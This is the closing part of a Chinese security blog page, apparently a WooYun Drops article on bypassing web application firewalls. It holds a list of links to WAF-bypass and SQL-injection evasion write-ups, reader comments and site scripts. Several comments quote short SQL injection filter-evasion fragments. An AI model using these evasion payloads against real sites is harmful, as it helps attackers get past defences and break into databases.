+<p>
+  WAF介绍http://www.nsfocus.com/waf/jishu/js_01.html
+</p>
+
+<p>
+  WAF实现扫描器识别http://drops.wooyun.org/tips/730　
+</p>
+
+<p>
+  WAF的绕过技巧http://drops.wooyun.org/tips/132
+</p>
+
+<p>
+  绕过waf的笔记http://fuck.0day5.com/?p=622
+</p>
+
+<p>
+  SQL注入中的WAF绕过技术http://netsecurity.51cto.com/art/201301/376869.htm
+</p>
+
+<p>
+  浅谈WAF的绕过http://netsecurity.51cto.com/art/201212/374068.htm　　
+</p>
+
+<p>
+  SQL注入攻防入门详解(MS SQL)http://www.2cto.com/Article/201211/165466.html    
+</p>
+
+<p>
+  Beyond SQLi: Obfuscate and Bypass http://www.exploit-db.com/papers/17934/
+</p>
+
+<p>
+  从基础到高级的waf绕过方法http://gnahackteam.wordpress.com/2012/07/06/basic-to-advanced-waf-bypassing-methods/　
+</p>
+
+<p>
+  Bypass WAFhttp://www.surfthecyber.com/2013/05/how-to-bypass-waf-web-application.html
+</p>
+
+<p>
+  WAF Bypassing: SQL Injection (forbidden or not?)http://www.r00tsec.com/2011/07/sql-injection-bypass-waf.html
+</p>
+
+<p>
+  WAF filter evasionhttp://sla.ckers.org/forum/read.php?24,33903
+</p>
+
+<p>
+  http://em3rgency.com/sql-injection-filter-evasion/
+</p>
+
+<p>
+  http://0haxor.blogspot.com/2012/08/waf-waf-bypassing.html
+</p>
+
+<p>
+  http://kaoticcreations.blogspot.com/p/sql-injection-waf-bypassing.html
+</p>
+
+<p>
+  http://kaoticcreations.blogspot.com/p/basic-sql-injection-101.html
+</p>
+
+<p>
+  http://websec.files.wordpress.com/2010/11/sqli2.pdf
+</p>
+
+<p>
+  http://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
+</p>      </p>
+    </section>
+  </article>
+  <!-- collect -->
+  <div class="entry-controls clearfix">
+        <div class="right-section">
+          <!-- <span class="control-item read-counts">
+            <i class="icon icon-eye"></i>13 人读过
+          </span> -->
+          <!-- ngIf: ownPost(post) -->
+          <a href="javascript:void(0)" name="colloct-button" class="control-item report ng-scope fav-add">
+            <i class="glyphicon glyphicon-star-empty"></i><span>收藏</span>
+          </a><!-- end ngIf: !ownPost(post) && !isCensoring -->
+          <!-- ngIf: !isCensoring --><div ng-transclude="" class="post-share-button post-menu-button ui-menu-button ng-scope" ng-class="{ true: 'open', false: 'close' }[open]" ui-menu-button="" onbeforeopen="beforeShareMenuOpen()" ng-if="!isCensoring">
+            <a href="javascript:void(0)" class="menu-button control-item share ng-scope"><i class="icon icon-share"></i>分享</a>
+            <menu class="menu ng-scope" tabindex="0">
+              <!-- ngRepeat: item in shareMenuItems --><div class="menu-item ng-binding ng-scope share-weibo" tabindex="0">
+              <a class="share-sina-weibo">
+                <i class="icon icon-share-sina"></i>新浪微博
+              </a>
+              </div><!-- end ngRepeat: item in shareMenuItems -->
+            </menu>
+          </div><!-- end ngIf: !isCensoring -->
+
+        </div>
+
+      </div>
+
+          
+  <!-- collect end -->
+  <!-- comment -->
+  <div id="comments" class="comment-list clearfix">
+            <div  class="new_comment" data-remote="true" id="new_comment">
+              <div class="comment-head">
+              <input type="hidden" name="comment_post_ID" value="968"/>
+                            <input type="input" placeholder="昵称" name="nickname"><br />
+                          <input type="input" placeholder="验证码" name="captcha"> <img id="captcha_img"  align="center" src="/wooyun/captcha.php" style="border:none; cursor:pointer" onclick="this.src='/wooyun/captcha.php?'+Math.random()"><br />
+            </div>
+      <div class="comment-text">
+        <textarea class="mousetrap" id="comment_content" maxlength="2000" placeholder="写下你的评论…"></textarea>
+        <div>
+          <input class="btn btn-info" data-disable-with="提交中..." name="commit" type="submit" value="发 表">
+          <span class="warning" style="display: none"><i class="fa fa-exclamation-circle"></i><span class="warning-text"></span></span>
+        </div>
+      </div>
+  </div>
+          <div id="comment-list">
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_2886.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">xyang</span>
+                 <span class="reply-time">2015-08-25 15:03:13</span>
+        </div>
+        <p>给力</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("xyang") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_48191431003751.gif">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">妖孽</span>
+                 <span class="reply-time">2015-07-31 11:23:39</span>
+        </div>
+        <p>mark 一发  顺便问下typo3那个是哪个版本的哇</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("妖孽") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_71111431080007.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Soulmk</span>
+                 <span class="reply-time">2015-06-26 17:32:50</span>
+        </div>
+        <p>学习啦啊</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("Soulmk") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_65301429586266.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Pray</span>
+                 <span class="reply-time">2015-04-20 15:38:01</span>
+        </div>
+        <p>很好 收藏一下!</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("Pray") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">菜鸟</span>
+                 <span class="reply-time">2015-02-14 11:38:15</span>
+        </div>
+        <p>马克学习！！</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("菜鸟") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_57071436425282.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">lnterface</span>
+                 <span class="reply-time">2015-01-03 13:16:13</span>
+        </div>
+        <p>好文章</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("lnterface") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">octopus_tan</span>
+                 <span class="reply-time">2014-12-22 17:39:15</span>
+        </div>
+        <p>@r00tgrok 我有点疑问：
+在“十六进制编码”的第一个栗子中：
+z.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/
+这里%6e是url编码而不是十六进制编码吧？是笔误还是确实就是这样？</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("octopus_tan") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">kwin</span>
+                 <span class="reply-time">2014-12-05 10:21:38</span>
+        </div>
+        <p>排版再好好处理下，就更好了</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("kwin") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_4461.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">迦南</span>
+                 <span class="reply-time">2014-11-19 16:52:38</span>
+        </div>
+        <p>好文收藏先</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("迦南") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_4915.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">RainShine</span>
+                 <span class="reply-time">2014-11-09 20:34:13</span>
+        </div>
+        <p>语死早？</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("RainShine") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">wangy3e</span>
+                 <span class="reply-time">2014-09-02 17:18:49</span>
+        </div>
+        <p>呵呵</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("wangy3e") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">wangy3e</span>
+                 <span class="reply-time">2014-09-02 17:18:27</span>
+        </div>
+        <p>呵呵h</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("wangy3e") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">踩花大盗</span>
+                 <span class="reply-time">2014-06-23 18:10:56</span>
+        </div>
+        <p>作者第二段的第二句话差点让我一口气没缓过来。。。看来作者不喜欢用标点符号。。。</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("踩花大盗") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_4522.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">spiderman</span>
+                 <span class="reply-time">2014-06-23 16:39:38</span>
+        </div>
+        <p>文章有错误,
+REVERSE(noinu)+REVERSE(tceles)语句是无法执行的
++un/**/ion+se/**/lect 这种语句也是无法执行的</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("spiderman") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">猥亵鸡肉男</span>
+                 <span class="reply-time">2014-03-31 11:13:10</span>
+        </div>
+        <p>哥充分地学习到了！</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("猥亵鸡肉男") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_1788.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">小贱人</span>
+                 <span class="reply-time">2014-03-12 16:39:05</span>
+        </div>
+        <p>对的</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("小贱人") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_226.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">z@cx</span>
+                 <span class="reply-time">2014-03-09 21:03:23</span>
+        </div>
+        <p>超级赞的文章</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("z@cx") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_1093.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Xeyes</span>
+                 <span class="reply-time">2014-03-09 02:08:06</span>
+        </div>
+        <p>赞!!!!!!!</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("Xeyes") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_85.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">applychen</span>
+                 <span class="reply-time">2014-03-05 15:01:04</span>
+        </div>
+        <p>畸形的HTTP请求可以绕过某些WAF……</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("applychen") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_2258.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">乌贼NO.1</span>
+                 <span class="reply-time">2014-03-04 18:10:50</span>
+        </div>
+        <p>总结很全面，看来花了不少时间，给力！</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("乌贼NO.1") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_2554.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Mody</span>
+                 <span class="reply-time">2014-03-04 15:03:35</span>
+        </div>
+        <p>很赞，收下了，谢谢</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("Mody") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_3127.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Stardustsky</span>
+                 <span class="reply-time">2014-03-03 12:03:12</span>
+        </div>
+        <p>好长，有时间一定要仔细研究研究……</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("Stardustsky") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_3710.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">depycode</span>
+                 <span class="reply-time">2014-03-03 11:45:51</span>
+        </div>
+        <p>学习了 ，感谢！</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("depycode") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_2853.jpg">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">寂寞的瘦子</span>
+                 <span class="reply-time">2014-03-02 20:45:09</span>
+        </div>
+        <p>写的非常的beautiful啊！</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("寂寞的瘦子") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://zone.wooyun.org/upload/avatar/avatar_12361434440495.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">mramydnei</span>
+                 <span class="reply-time">2014-03-02 19:37:28</span>
+        </div>
+        <p>抢个沙发，顺便补充一下
+MSSQL的话，从0x01到0x20的字符，应该都可以代替空格</p>
+        <div class="comment-footer clearfix">   <a class="reply pull-right" onclick=reply("mramydnei") href="javascript:void(null)"> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>
+      </div>
+    </div>
+      </div>
+  </div>
+  <!-- comment end -->
+  <aside class="sidebar">
+    <div class="block column-about">
+      <a href="/author/r00tgrok" class="avatar-link">
+        <img class="avatar-big" ng-src="http://zone.wooyun.org/upload/avatar/avatar_3775_b.jpg" src="http://zone.wooyun.org/upload/avatar/avatar_3775_b.jpg">
+      </a>
+      <a href="/author/r00tgrok" class="title ng-binding">r00tgrok</a>
+      <!-- ngIf: column.creator.slug == me.slug -->
+      <div class="followers" ng-switch="" on="!!column.followersCount">
+
+      </div>
+      <div class="description ng-binding" ng-bind-html="column.description | linky"></div>
+    </div>
+
+    <div class="block rel-topics ng-hide" ng-show="!isCensoring &amp;&amp; (post.topics.length || ownPost(post))">
+      <!-- ngIf: post.topics.length -->
+      <!-- ngIf: ownPost(post) -->
+    </div>
+
+  </aside>
+</div>
+</body>
+
+<script>
+  //代码高亮功能
+  $ = jQuery;
+
+  $("pre").each(function(){
+    txt = $(this).text();
+    lang = txt.split("\n")[0];
+    if(lang.indexOf("#!") == 0){
+      name = lang.replace("#!", "");
+      txt = txt.replace(lang + "\n", "");
+      $(this).addClass("brush:" + name)
+    }else{
+      $(this).addClass("highlight");
+    }
+    $(this).text(txt)
+  })
+
+  function TimeToStr(){
+    var now = new Date();
+
+    var year = now.getFullYear();       //年
+    var month = now.getMonth() + 1;     //月
+    var day = now.getDate();            //日
+
+    var hh = now.getHours();            //时
+    var mm = now.getMinutes();          //分
+    var ss = now.getSeconds();
+
+    if(month < 10){
+      month = "0" + month;
+    }
+    if(day < 10){
+      day = "0" + day;
+    }
+    if(ss < 10){
+      ss = "0" + day;
+    }
+    return year + "-" + month + "-" + day + " " + hh + ":" + mm + ":" + ss;
+  }
+
+  var reply = function(name){
+    data = $("#comment_content").val();
+    value = data + "@" + unescape(name) + " ";
+    $("#comment_content").val(value);
+    $("html,body").animate({scrollTop:$("#comments").offset().top},1000)
+  }
+
+  function js_relace(str){
+    return str.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  }
+  $("input[name=commit]").bind("click", function(){
+    $("input[name=commit]").attr("value", "提交中...")
+
+    author = $("input[name=nickname]").val();
+    content = $("#comment_content").val();
+    captcha = $("input[name=captcha]").val();
+    comment_post_ID = $("input[name=comment_post_ID]").attr("value")
+    $.post("/wp-comments-ajax.php", {comment_post_ID: comment_post_ID, author: author, comment: content, captcha: captcha}, function(data){
+      $("input[name=commit]").attr("value", "发 表")
+      //清空验证码
+      $("input[name=captcha]").val("");
+      if(data.status == 1){
+        alert("操作失败");
+        return;
+      }
+
+      id = "note-conmment-" + Math.round(Math.random() * 1000);
+      html = '  <div class="note-comment" id="'+ id + '" style="display:none">\
+          <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">\
+          <div class="content">\
+            <div class="comment-header"><span class="author-link">' + js_relace($("input[name=nickname]").val()) +'</span>\
+              <span class="reply-time">' + TimeToStr() + '</span>\
+            </div>\
+            <p>'+ $("#comment_content").val() +'</p>\
+            <div class="comment-footer clearfix">   <a href="javascript:void(null)" class="reply pull-right" onclick=reply("' + escape($("input[name=nickname]").val()) + '")> <i class="glyphicon glyphicon-hand-up"></i>回复  </a></div>\
+          </div>\
+        </div>';
+
+      $($.parseHTML(html)).prependTo("#comment-list");
+
+      $("#" + id).fadeIn(1000);
+      //清空评论
+      $("#comment_content").val("");
+
+      $("#captcha_img").click()
+
+    }).error(function(xhr,errorText,errorType){
+      $("input[name=commit]").attr("value", "发 表")
+      alert("您提交评论的速度太快了，请稍后再发表评论");
+    });
+
+  })
+
+  $(function(){
+    $("#captcha_img").click()
+  })
+
+  $(function (){
+    $("[data-toggle='popover']").popover();
+  });
+  //判断是否为移动端
+  if (navigator.userAgent.match(/(iPhone|iPod|Android|ios|SymbianOS)/i)){
+    $(".navbar-wooyun").addClass("hidden");
+    $(".navbar-mobile").removeClass("hidden");
+    $("body").addClass("navbar-mobile-show");
+  }
+
+  //收藏 取消收藏功能
+  var postID='968';
+  var token='';
+  var actionUrl='/wooyun/action.php';
+
+  //添加收藏
+  $(document).on("click", ".fav-add", function(){
+    if(token == ""){
+      alert("请登录后操作");
+      return;
+    }
+    $.getJSON(actionUrl, {'act': 'collect', 'id': postID, 'token': token, 'rid':Math.random()}, function(data){
+      if(data.error == 0){
+        //操作成功
+        $(".fav-add").removeClass("fav-add").addClass("fav-cancel");
+        $(".fav-cancel").find("i").removeClass("glyphicon-star-empty").addClass("glyphicon-star");
+        $(".fav-cancel").find("span").text("已收藏");
+      }else{
+        alert(data.content);
+      }
+    })
+  });
+  //取消收藏
+  $(document).on("click", ".fav-cancel",function(){
+    $.getJSON(actionUrl, {'act': 'collectcancel', 'id': postID, 'token': token, 'rid':Math.random()}, function(data){
+      if(data.error == 0){
+        //操作成功
+        $(".fav-cancel").removeClass("fav-cancel").addClass("fav-add");
+        $(".fav-add").find("i").removeClass("glyphicon-star").addClass("glyphicon-star-empty");
+        $(".fav-add").find("span").text("收藏");
+      }else{
+        alert(data.content);
+      }
+    })
+  })
+
+//判断用户是否已经收藏
+if(token != ""){
+  $.getJSON(actionUrl, {'act': 'checkcollect', 'id': postID, 'token': token, 'rid':Math.random()}, function(data){
+    if(data.error == 1){
+      //已经收藏了
+      $(".fav-add").removeClass("fav-add").addClass("fav-cancel");
+      $(".fav-cancel").find("i").removeClass("glyphicon-star-empty").addClass("glyphicon-star");
+      $(".fav-cancel").find("span").text("已收藏");
+    }
+  })
+}
+//控制分享代码
+$(document).on("mouseover", ".post-share-button", function(){$(".post-share-button").addClass("open")})
+$(document).on("mouseleave", ".post-share-button", function(){$(".post-share-button").removeClass("open")})
+
+$(document).on("click", ".share-weibo", function(){
+  $(".post-share-button").removeClass("open");
+})
+//设置一下微博分享的链接
+$(".share-sina-weibo").attr("target", "_blank");
+share_title = $("header h1").text() + "（分享来自 @乌云知识库 · 作者：" + $("header div a").attr("href").replace("/author/", "") +  "）";
+share_url = escape(location.href)
+share_pic = $($(".entry-content img")[0]).attr("src");
+share_url = "http://service.weibo.com/share/share.php?title= " + share_title + "&url=" + share_url + "&pic=" + share_pic;
+$(".share-sina-weibo").attr("href", share_url)
+</script>
+<script>
+/* <![CDATA[ */
+var rcGlobal = {
+	serverUrl		:'http://drops.wooyun.org',
+	infoTemp		:'%REVIEWER% 在 %POST%',
+	loadingText		:'正在加载',
+	noCommentsText	:'没有任何评论',
+	newestText		:'&laquo; 最新的',
+	newerText		:'&laquo; 上一页',
+	olderText		:'下一页 &raquo;',
+	showContent		:'1',
+	external		:'1',
+	avatarSize		:'32',
+	avatarPosition	:'left',
+	anonymous		:'匿名'
+};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushAS3.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushBash.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushColdFusion.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushClojure.js?ver=20090602'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushCpp.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushCSharp.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushCss.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushDelphi.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushDiff.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushErlang.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushFSharp.js?ver=20091003'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushGroovy.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushJava.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushJavaFX.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushJScript.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushLatex.js?ver=20090613'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushMatlabKey.js?ver=20091209'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushObjC.js?ver=20091207'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPerl.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPhp.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPlain.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPowerShell.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPython.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/third-party-brushes/shBrushR.js?ver=20100919'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushRuby.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushScala.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushSql.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushVb.js?ver=3.0.83c'></script>
+<script type='text/javascript' src='http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushXml.js?ver=3.0.83c'></script>
+<script type='text/javascript'>
+	(function(){
+		var corecss = document.createElement('link');
+		var themecss = document.createElement('link');
+		var corecssurl = "http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.83c";
+		if ( corecss.setAttribute ) {
+				corecss.setAttribute( "rel", "stylesheet" );
+				corecss.setAttribute( "type", "text/css" );
+				corecss.setAttribute( "href", corecssurl );
+		} else {
+				corecss.rel = "stylesheet";
+				corecss.href = corecssurl;
+		}
+		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
+		var themecssurl = "http://drops.wooyun.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.83c";
+		if ( themecss.setAttribute ) {
+				themecss.setAttribute( "rel", "stylesheet" );
+				themecss.setAttribute( "type", "text/css" );
+				themecss.setAttribute( "href", themecssurl );
+		} else {
+				themecss.rel = "stylesheet";
+				themecss.href = themecssurl;
+		}
+		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
+		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
+	})();
+	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
+	SyntaxHighlighter.config.strings.help = '帮助';
+	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
